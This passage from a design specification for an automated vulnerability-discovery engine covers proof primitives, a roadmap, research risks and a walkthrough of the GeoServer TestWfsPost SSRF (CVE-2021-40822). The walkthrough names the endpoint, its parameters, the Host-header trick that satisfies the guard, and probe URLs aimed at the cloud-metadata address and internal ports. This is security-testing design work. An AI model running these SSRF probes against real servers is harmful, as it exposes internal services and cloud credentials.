  observation   # what to measure (response field, side channel, OOB hit, timing, count)
  discriminator # the P1–P6 test that distinguishes "capability fired under attacker control"
                #   from "reflection / error / coincidence"  ← MUST cite a confirmation primitive
```

The 19 `_test_*` methods are, in this framing, **hand-tuned proof obligations**
for known classes. A `CapabilityPrimitive.proof_obligation_template` is the same
recipe, abstracted to the primitive and instantiated per channel by the
Hypothesis Agent.

### 6.3 Two integration tiers

**Tier A — bind to an existing methodology (available now).** Most convergent
hypotheses map onto one of the 19 `_test_*` methods. The discovery engine's
value here is *selection and seeding*: choosing the right methodology + channel +
capability-informed payload seed that black-box enumeration would never have
tried (e.g. "this ORM has a raw escape hatch on *this* code path → run `_test_sqli`
against *this* body param with a dialect seed"). Zero new proof code. The
hypothesis becomes a parameterized `ExploitTask` and rides the existing plan-union.

**Tier B — generic obligation runner (frontier).** Divergent/novel hypotheses do
not fit any `_test_*`. They supply a `ProofObligation` executed by a **generic
obligation runner** — one new proof-engine component that: captures the baseline,
places the trigger on the channel via the existing carrier machinery (`_send_probe`
and its JSON/cookie/multipart/XML siblings), takes the observation, and applies
the cited P1–P6 discriminator using the *existing* honesty helpers
(`_cmdi_body_has_error`, `_normalise_for_echo_compare`, file-signature matchers,
baseline fingerprinting). The runner is deliberately *constrained* — it can only
express P1–P6 — which is exactly what keeps it zero-FP. **Building this runner is
the single largest new proof-engine effort (§9), and Tier B true-novelty is
blocked until it and an OOB collaborator (P6) exist.**

### 6.4 Hypothesis → job mapping and the volume gate

```
Hypothesis ──► (Tier A) ExploitTask{test_method, endpoint, params, param_locations, tier, seed}
           └─► (Tier B) ProofObligationTask{obligation, channel_ref, primitive_id}
                    │
                    ▼   union at _merge_coverage (third source alongside LLM + deterministic plan)
              Exploit round-robin dispatch (_step_execute_exploits) ── unchanged
                    │
                    ▼   emission only on a fired P1–P6 discriminator
              Finding (existing model) ── dedup at _persist_finding ── unchanged
```

**Volume never becomes noise**, enforced at three points that already exist or
extend cleanly:

1. **The obligation gate (primary).** No falsifiable obligation citing a
   confirmation primitive → not a finding candidate, at most an operator
   research-lead. This is why divergent creativity is safe.
2. **Ranking + fairness.** Hypotheses are ranked by `Δ-grade × reach_confidence ×
   primitive_evidence_grade` and dispatched through the existing round-robin so a
   flood of low-confidence divergent hypotheses cannot starve high-confidence
   convergent ones. `EXPLOIT_MAX_PLAN_TASKS` still bounds the queue.
3. **Dedup + post-run FP marking.** The existing `_persist_finding` dedup and
   Step-3b false-positive pass apply unchanged; novel findings are subject to the
   same reflection-in-error-page scrutiny as native ones.

---

## 7. KB evolution — the learning loop

The loop that makes Clinkz get smarter is now expressed at the **primitive**
level, not the technique level.

### 7.1 Confirmed hypothesis → catalog promotion (the flywheel)

When the proof engine confirms a hypothesis:

- The `(technology, primitive, proof_obligation)` triple is **promoted** in the
  catalog: `evidence_grade` bumped, provenance annotated with this engagement.
- If the primitive was `HYPOTHESIZED` for that technology (not previously
  catalogued — a genuinely novel capability-reachability discovery), it becomes a
  **catalogued primitive**. From then on, *every future target on that technology
  gets it as a cheap convergent hypothesis.* **This is the zero-day → known-
  technique flywheel** — the first proof of a novel primitive on tech X seeds all
  future tech-X targets.
- The confirmed reachability path is retired into the graph as `STATIC_CONFIRMED`
  shape knowledge (§4.3).

### 7.2 Failed hypothesis → negative priors (distinguish *why*)

Failure is signal, and the *reason* matters:

- **Failed because not reachable** → lower the reachability prior for that
  `(primitive × channel-shape)`; don't waste budget on the same dead pattern.
- **Failed because config-gated** → strengthen `gating_config` knowledge: this
  flag genuinely disables the primitive. Feeds the Intent Agent's Δ subtraction
  next time.
- **Failed because un-provable (no obligation fired but suspicious)** → an
  operator research-lead, and a candidate for the OOB-collaborator backlog (P6).

### 7.3 Mechanics (extend, don't reinvent)

- Reuse `technique_results` mechanics as **`primitive_results`**: record every
  hypothesis outcome against the primitive with the engagement id and the
  proof-engine verdict. Recompute a per-primitive **evidence grade** analogous to
  `success_rate` — **but with a strict semantic firewall:** evidence grade drives
  *prioritization only*, never emission. Emission is always live-proof-gated.
  (This mirrors the existing lesson that the LLM's ranking is advisory while the
  deterministic proof is authoritative.)
- Reuse `technology_relations` for **primitive transfer**: a primitive confirmed
  on tech A is emitted as a *lower-confidence* hypothesis on related tech B (e.g.
  "operator-injection confirmed on MongoDB driver → hypothesize on a related
  NoSQL driver"). Cross-tech transfer, lifted to the primitive level.
- Record cross-engagement primitive discoveries in `past_engagements`-style
  summaries so the catalog's growth is auditable.

---

## 8. Roadmap — the confirmation-primitive set *is* the spine

The discoverable-vuln universe is **exactly** bounded by the confirmation-primitive
vocabulary (P1–P6, §6.1). This is not a limitation to be worked around — it is the
product boundary, and it is the spec:

> **A capability class becomes discoverable when — and only when — its proof
> obligation reduces to a confirmation primitive Clinkz has built. Obligations that
> do not reduce to P1–P6 are not emitted. Emitting one anyway is precisely how
> zero-FP breaks.**

So the roadmap is not "add agents." It is **"add confirmation primitives, and
inherit every vuln class whose obligation reduces to them."** You expand what you can
*discover* by expanding what you can *prove*. Everything else — catalog growth,
reachability, ranking — improves *recall and cost within* the boundary the primitive
set draws; **only a new primitive moves the boundary.**

**What each primitive already unlocks (the discoverable set today, P1–P5):**

| Primitive | Vuln classes whose obligation reduces to it | Discoverable now? |
|---|---|---|
| P1 differential baseline | SQLi (boolean), IDOR, access-control differentials, **in-band SSRF (reachable vs unreachable internal host)** | **yes** |
| P2 reflection-guarded marker | CMDi (echo-canary), reflected/stored XSS, SSTI eval | **yes** |
| P3 content-we-never-sent | LFI, XXE file disclosure, **in-band SSRF (internal content reflected)** | **yes** |
| P4 in-band-effect-matching-a-control | JWT forgery, auth bypass, SSRF metadata signature | **yes** |
| P5 bounded side-effect | time-based SQLi/NoSQLi, ReDoS, bounded XXE expansion | **yes** |
| **P6 out-of-band callback** | **blind SSRF, blind CMDi, blind XXE exfil, deserialization RCE, Log4Shell-class blind egress** | **NO — primitive not built** |

The table is the roadmap's true north: **five of six primitives exist, and the sixth
is the gate on the entire blind-egress half of the vuln universe.**

### 8.1 P6/OOB is a precondition, not a footnote

> **Design:** P6 now has its own think-on-paper spec —
> [`docs/p6-oob-design.md`](./p6-oob-design.md) — covering the collaborator infra +
> scope guardrail, the unforgeable-nonce zero-FP semantics, the wall-clock
> proof-budget economics, engine integration through the existing proof seam, and a
> verified Log4Shell (Vulhub Solr 8.11.0 / Log4j 2.14.1) walkthrough. This section is
> the summary; that doc is the detail.

The flagship "discover a Log4Shell-class bug" use case is **literally unconfirmable
without P6.** Log4Shell is blind by construction — JNDI egress to an attacker host,
no in-band signal — so its proof obligation *cannot* reduce to P1–P5; it reduces to
P6 or to nothing. The same is true of blind SSRF (no reflection), blind
OS-command injection, blind deserialization gadget chains, and any exfil-over-DNS
class. **Until an OOB collaborator exists, none of these is discoverable — not
because the discovery engine can't hypothesize them, but because the proof engine
can't confirm them, so by the boundary-as-feature spec they are correctly *not
emitted*.**

This reorders the build. P6 is not step 4's afterthought; it is the **precondition
for an entire class of discovery**, and must be sequenced as deliberately as the
catalog. Standing up an OOB collaborator safely (in-scope, without becoming attacker
infrastructure) is its own design (§9 risk 4) — but the roadmap must treat it as
*the gating dependency it is*, not a "later." The honest statement to the owner:
**without P6, the marquee use case is out of scope of what can be built at all**, and
the near-term deliverable is the P1–P5 in-band half — which, per the GeoServer
walkthrough (§10), is genuinely valuable and includes real SSRF.

### 8.2 Build order, re-anchored on the primitive spine

Each step names the primitive work that moves the boundary and the discovery
machinery that raises recall within it:

1. **P1–P5 in-band, Tier-A only (no new primitive).** Catalog + Capability re-scope
   (CVE/CWE bootstrap) → Intent Δ over source → intra-function `STATIC_CONFIRMED`
   reachability → Δ-directed selection/seeding of the *existing* 19 `_test_*`
   methods. Every hypothesis binds to a built methodology, so it reduces to a built
   primitive by construction. **First measurable lift, zero new proof code, zero
   zero-FP risk.** This is the GeoServer-class in-band SSRF slice (§10).
2. **P1–P5 in-band, Tier-B generic obligation runner (no new primitive, new
   *executor*).** Build the one component that can express an *arbitrary* P1–P5
   obligation (not just the 19 hand-tuned ones), using the existing honesty helpers.
   Unlocks convergent hypotheses that *don't* map onto an existing `_test_*` but
   still reduce to P1–P5. The boundary doesn't move; the machinery to reach it
   generalizes. **The largest new proof effort that does not require OOB.**
3. **P6 out-of-band collaborator (moves the boundary).** The first genuine boundary
   expansion. Unlocks the entire blind-egress half in one step: blind SSRF, blind
   CMDi/XXE, deserialization, **Log4Shell-class**. Gated on the collaborator design
   (§9 risk 4). Nothing above the in-band line is discoverable before this lands.
4. **Recall-within-boundary: chaining, log-sink / stored / parsed-file channels,
   cross-tech primitive transfer.** Raises recall for classes *already* inside the
   boundary; needs the reachability and catalog work of §3–§4, not a new primitive.
5. **Frontier reachability (cross-service, business-logic).** Highest candidate
   volume, weakest prior — gated on the proof-budget economics of §4.3, not on a
   primitive.

The ordering is deliberate: **steps 1–2 exhaust the in-band boundary; step 3 is the
single move that opens the blind half; steps 4–5 are recall and cost, not boundary.**
Each step degrades to the previous cleanly; the floor is always today's pipeline.

---

## 9. Open questions & research risks (foregrounded — the point of this doc)

These are unsolved. Surfacing them is the deliverable; do not read past them as
if the earlier sections closed them.

1. **Proof-budget economics — the relocated hard problem, and risk #1 (§4.3).**
   Reframing reachability as a prior removes false-*positive* risk but relocates the
   difficulty onto a proof budget **nothing sizes.** A job is a heterogeneous unit
   (Tier-A probe burst / Tier-B + LLM planning / P6 wall-clock OOB wait); an
   engagement has no phase deadline today (`EXPLOIT_PHASE_BUDGET=0`), so an unbounded
   discovery source can out-produce the proof engine and miss the real vuln by
   **budget exhaustion** — a false *negative*, not a false positive, and therefore
   invisible (nothing looks broken). We have **no data** on whether `Δ-grade ×
   reach_confidence × primitive_evidence_grade` ranks well enough to land the true
   vuln in the affordable top-N, **no sizing** for the per-class reserved shares /
   volume caps / confidence floor (§4.3.1) that stop a weak cross-service prior from
   starving a strong convergent one, and **no measured cost-per-job**. This is the
   make-or-break bet of the whole engine — named, not solved.

2. **Cross-service reachability without full source — the hardest *prior*.** The
   frontier reachability class (cross-service, business-logic) is where the weak,
   high-volume prior of risk #1 actually originates: `HYPOTHESIZE` every
   cross-service edge and you generate an unbounded number of plausible-but-wrong
   hypotheses. §4.3 avoids the FP risk (proof engine is arbiter), but the *recall*
   question stays open: is the plausibility prior from wiring + partial source good
   enough to surface the real cross-service path *within* the budget guards of risk
   #1? Unknown. The make-or-break risk for the frontier specifically.

3. **Generic proof-obligation runner (Tier B).** Building a runner expressive
   enough for novel obligations but constrained enough to stay zero-FP is a real
   research build, not an afternoon. Today's 19 methods are hand-tuned; a generic
   P1–P6 executor with the same honesty is unproven. **Until it exists, "novel/
   zero-day" is limited to Tier-A convergent (catalogue-seeded known classes) —
   valuable, but not the Log4Shell dream.** Are P1–P6 actually a *complete* basis
   for confirming arbitrary capability firing, or will novel primitives need
   confirmation shapes we haven't enumerated?

4. **OOB collaborator (P6) is a hard dependency for the flagship.** Log4Shell is
   *blind* — JNDI egress to an attacker host with no in-band signal. The current
   system defers *all* out-of-band confirmation. **The marquee "discover a
   Log4Shell-class bug" use case is literally impossible to confirm without an
   OOB collaborator (DNS/HTTP callback infrastructure).** §8.1 now treats P6 as a
   sequenced *precondition* for the entire blind-egress half of the vuln universe,
   not a "later" — but standing the collaborator up safely, in-scope, and without
   becoming attacker infrastructure is still its own design, now written up in
   [`docs/p6-oob-design.md`](./p6-oob-design.md) (§P6.1.5 guardrail, §P6.3.4 the
   egress-filtered false-negative floor).

5. **CVE → primitive abstraction reliability.** The catalog's quality is bounded
   by an LLM's ability to strip target-specificity and keep the true primitive
   (§3.4). Mis-abstraction is structurally contained (bad primitive → wasted
   budget, not a false finding) but a systematically wrong catalog degrades recall
   *and* burns budget. How do we measure catalog quality? What's the human-review
   loop for new primitives, if any?

6. **Divergent hypothesis volume vs. proof budget** (the divergent-generation
   instance of risk #1). Even fully proof-gated, generating too many divergent
   hypotheses costs wall-clock and LLM spend. Is `Δ-grade × reach_confidence ×
   primitive_evidence_grade` a good enough ranking to keep recall high under a
   bounded budget? We have no data yet on the precision of these priors.

7. **Intent inference is inherently fuzzy.** "What the developer meant" is not
   crisply recoverable from code. A capability with a call site *and a guard* can
   still be vulnerable (bypassable guard); a capability with no call site might be
   dead, not exposed. Δ is a graded belief, not a boolean. Risk of *under*-counting
   (treating a bypassable guard as sanction → missing the bug) — the opposite
   failure from FPs, and one the proof engine cannot catch because we never
   hypothesize it.

8. **Version precision.** "Log4j present" is not a primitive — the primitive is
   version-gated (2.15 partial, 2.16/2.17 progressively fixed). Catalog must be
   version-range-aware *and* manifest parsing must be version-exact, or Δ is
   simply wrong. Fingerprint-only targets (no manifest) inflate Capability
   (assume-vulnerable), trading precision for recall — acceptable, but it moves
   cost to proof budget again.

9. **Business-logic / request-sequence channels barely started.** Representing
   application *state* so we can reason about sequence-based reachability
   (checkout quantity, workflow step-skip, TOCTOU) is close to unsolved here.
   First build is templated patterns only; inferring the state machine from
   source/behavior is open.

10. **Source trust and ingestion safety.** Ingested target source is untrusted
    input: it may be generated, vendored (not matching the manifest), partial, or
    deliberately misleading. Ingestion must stay regex/bounded-AST-only (no `eval`),
    sandboxed, and skeptical — and we must decide how much to *trust* source claims
    vs. verify them against runtime behavior (a manifest can lie; the running app
    cannot).

11. **Agent decomposition (open call).** Four layers ≠ necessarily four agents.
    Intent + Reachability share the `SourceModel` and are tightly coupled;
    co-locating them as one "Surface Agent" may be the right first build. Splitting
    is cleaner on paper (this doc) but adds Orchestrator routing overhead. To be
    decided with the owner.

12. **Where does the catalog's cold-start corpus come from, and who curates it?**
    Bootstrapping from public CVE/CWE/bug-bounty data is noisy and legally/ethically
    bounded. The offline framework-source ingestion (§3.4 path 3) is the most
    differentiated but also the most labor-intensive. Is there a seed set of
    technologies to prove the model on first? The GeoServer fixture (§10) is the
    first concrete source-available, real-SSRF seed chosen for exactly this — the
    multi-service / source-available shape DVWA and Juice Shop lack.

---

## 10. Validation walkthrough — GeoServer TestWfsPost SSRF (CVE-2021-40822)

The doc has been abstract; this section runs one **real, verified, source-available**
vulnerability end-to-end through all four layers *on paper*, and is explicit about
where the engine would miss it. It is the concrete pressure-test the owner asked for.

**The fixture (verified).** CVE-2021-40822 — unauthenticated SSRF in GeoServer's
`TestWfsPost` servlet (GeoServer ≤ 2.18.5 and 2.19.0–2.19.2; Vulhub
`geoserver/CVE-2021-40822`). GeoServer is open-source Java, so its source is
ingestible. The endpoint is `POST /geoserver/TestWfsPost` with parameters `url` (the
target the server will fetch), `body` (empty ⇒ the server issues a GET, any value ⇒
POST), and optional `username`/`password` (basic auth forwarded to the target). **It
is in-band:** the fetched URL's response is reflected verbatim in the HTTP response to
the attacker ("you will see that response from `google.com` is returned"). The only
constraint is that the `url` host match the request's `Host` header — *both
attacker-controlled* — and only when `PROXY_BASE_URL` is unset (the default).
Confirmation therefore does **not** need an OOB collaborator; this is the Tier-1
in-band case the fixture was chosen to represent. (The same servlet re-surfaced years
later as CVE-2024-29198 — a fact that itself argues for cataloguing the *primitive*,
not the payload.)

**The claim under test:** the design finds this vuln as a **Tier-A convergent
hypothesis**, proves it with an **existing** confirmation primitive (P3, and/or P1),
needs **no** OOB, and its main failure risks are in *channel enumeration* and *Δ
adjudication* — not in proof.

### (a) Capability catalog — does the fetch capability transfer as a primitive, not a payload?

**Yes, by three independent paths — the layer least likely to fail.**

- The relevant entry is the primitive `EGRESS_FETCH`: *"a request-derived string
  becomes the target of a server-side outbound HTTP fetch, whose response may return
  in-band."* This is **payload-free and technology-invariant** — it says nothing about
  `/geoserver/TestWfsPost` or the `url` parameter name. It is already the primitive
  class underpinning the existing `_test_ssrf` methodology (§3.1, §6.1), so it is in
  the catalog on day one, before any GeoServer-specific knowledge.
- Its `proof_obligation_template` is "internal content reflected in-band (P3) *or*
  reachable-vs-unreachable differential (P1)" — again generic.
- Where a GeoServer-*specific* entry would come from, if wanted: (i) CVE-2021-40822
  through the abstraction checkpoint (§3.4 path 1) → the *same* `EGRESS_FETCH`
  primitive with `technology_pattern` GeoServer/Java-servlet and a `gating_config`
  note `PROXY_BASE_URL`; or (ii) framework-source ingestion (§3.4 path 3) reading
  `TestWfsPost.java`'s `openConnection(new URL(request.getParameter("url")))` — a
  primitive derived from code *independent of any CVE*.

**Verdict (a): transfers cleanly.** Primitive-not-payload is exactly right here; the
capability is generic SSRF egress and the catalog already holds it.

### (b) Intent inference — intended behavior vs. the Δ

`SourceModel` over `TestWfsPost.java` yields: an **entrypoint** (`POST
/geoserver/TestWfsPost`, params `url`/`body`), a **call site** with capability hint
`EGRESS_FETCH` (`URL.openConnection` on a request-derived string), and a **config
fact** — the guard: *the `url` host is validated against `PROXY_BASE_URL` if set, else
against the request `Host` header.*

The intended behavior is legible from the servlet's shape: a **test tool that POSTs a
WFS request to the GeoServer's own OWS endpoint** — a self-directed proxy, not a
general fetcher. So Capability = "fetch any URL"; Intent = "fetch my own OWS
endpoint"; **Δ = arbitrary egress**, present because the only guard is
attacker-satisfiable.

The load-bearing step is the **Δ-adjudication LLM checkpoint** (§2.4 step 4): a naive
static reader sees *a host check exists* → "guarded / sanctioned" → low Δ →
de-prioritized. The correct adjudication is *the guard compares two attacker-controlled
values (`url` host vs `Host` header) when `PROXY_BASE_URL` is unset* → **bypassable →
high Δ, config-gated-exposed.** A clean instance of the `gating_config` mechanic:
`PROXY_BASE_URL` set ⇒ subtract the primitive (real guard against a fixed admin
value); unset (default) ⇒ leave it in Δ.

**Verdict (b): recoverable, but this is the sharpest failure risk in the whole
walkthrough** — if Intent scores the host check as a real guard, Δ collapses and the
hypothesis never earns budget. This is open-question #7 (bypassable-guard under-count)
made concrete. The design *can* get it right; it is not *guaranteed* to.

### (c) Reachability — does the prior rank it high enough to spend budget?

The **easy** reachability case, and the strongest part of the trace:

- The `url` request param reaches the `openConnection` sink **in the same handler** —
  an **intra-function** path, grade `STATIC_CONFIRMED` (§4.2), the cheapest, soundest
  grade. No call-graph walk, no cross-service inference, no OOB.
- The ranking `Δ-grade × reach_confidence × primitive_evidence_grade` is high on all
  three factors (high Δ from (b), `STATIC_CONFIRMED` reach, mature SSRF primitive), so
  under §4.3's budget economics it sits in the affordable top-N and dispatches early —
  *provided* the per-class budget partition (§4.3.1 guard 1) reserves share for
  `STATIC_CONFIRMED` convergent hypotheses so a weak cross-service prior can't starve
  it.

**But there is a real channel-enumeration gap in black-box mode.**
`/geoserver/TestWfsPost` is a demo servlet often **not linked** from the crawled app
surface. With **no source**, the discovery engine degrades to catalog-seeded
hypotheses over *crawled* channels — and if the crawler never finds `TestWfsPost`, the
channel is never enumerated and `_test_ssrf` never runs against it. The vuln is missed
**at channel discovery, not at proof.** *This is precisely where source ingestion
earns its keep:* the entrypoint comes from `SourceModel.entrypoints`, so the gray-box
path surfaces a channel the black-box crawler misses. The walkthrough thus doubles as
the argument for the whole gray-box design.

**Verdict (c): ranked high with source; missed at channel enumeration without it** — a
recall gap the engine's own source layer closes.

### (d) Proof — which P1–P6 primitive confirms it?

Reduces to in-band primitives, **no OOB**:

- **P3 (content we never sent):** point `url` at an internal-only service or cloud
  metadata (`http://169.254.169.254/latest/meta-data/…`) and confirm the response
  reflects content that service returns and the payload never contained — the exact
  honesty discipline of the existing SSRF metadata-signature match (§6.1;
  `_SSRF_METADATA_SIGNATURES`, IAM field-name-not-value).
- **P1 (differential):** `url=http://127.0.0.1:<open-port>` vs a closed port /
  non-resolving `.invalid` control, confirmed by a status/latency/body divergence the
  value-echo can't explain (`_ssrf_fetch_signal`).

Both are **in-band** and both are already implemented — so this binds to the **existing
`_test_ssrf` methodology as a Tier-A job** (§6.3). **Zero new proof code; zero new
primitive; the fixture assumption is verified — genuinely a Tier-1 in-band case, not
an OOB one.**

**One concrete proof-layer gap the fixture exposes.** The vuln only fires when the
request `Host` header matches the `url` host (Proxy-Base-URL-unset path). The current
`_test_ssrf` carrier injects the internal URL as a *param value* but does **not**
rewrite the `Host` header to match. So even when correctly dispatched, the existing
methodology **could fail to confirm** unless the primitive's `proof_obligation_template`
carries a per-instance carrier constraint — *"align the `Host` header with the injected
`url` host"* — that the generic SSRF probe does not express today. This is a real,
actionable finding: some Tier-A bindings need a **carrier-constraint field** on the
obligation template, discoverable only by running a concrete fixture. It is the single
most useful thing this walkthrough surfaces for implementation.

**Verdict (d): confirmable in-band via P3/P1, Tier-A — with one carrier-constraint gap
to close in the obligation template.**

### Walkthrough result — FOUND on paper, with named gaps

**Found.** With source ingested, the design discovers CVE-2021-40822 as a **Tier-A
convergent SSRF hypothesis**, ranks it high on a `STATIC_CONFIRMED` intra-function
prior, and confirms it in-band via **P3 (and/or P1)** on the existing `_test_ssrf`
machinery — **no OOB, no new primitive.** The fixture's Tier-1 in-band assumption is
**verified.**

It would **fail to find it** in three concrete, named places — and the point of the
walkthrough is that all three are *outside the proof layer*, exactly as the zero-FP
design predicts:

1. **Channel enumeration, black-box only** — no source ⇒ the unlinked demo servlet may
   never be crawled ⇒ the channel is never enumerated. *Closed by source ingestion —
   the gray-box value-add.*
2. **Δ under-count** — if Intent scores the attacker-controlled `Host`-vs-`url`-host
   check as a real guard, Δ collapses and the hypothesis never earns budget
   (open-question #7, made concrete).
3. **Carrier-constraint gap in the obligation template** — the existing `_test_ssrf`
   probe doesn't align the `Host` header to the injected `url` host, so this Tier-A
   binding dispatches but may fail to confirm without a per-instance carrier
   constraint.

None of the three is a false-*positive* risk; all three are **recall / plumbing** —
exactly the class of problem the proof-budget-and-boundary framing (§4.3, §8) predicts
the engine should have. The GeoServer fixture is a good Tier-1 anchor **because it is
confirmable in-band**, and because failing to find it (if it failed) would be for
reasons the design already names as open questions, never for a broken proof.

---

*End of specification. Pressure-test §9 risk #1 (proof-budget economics) and the §10
walkthrough result first.*
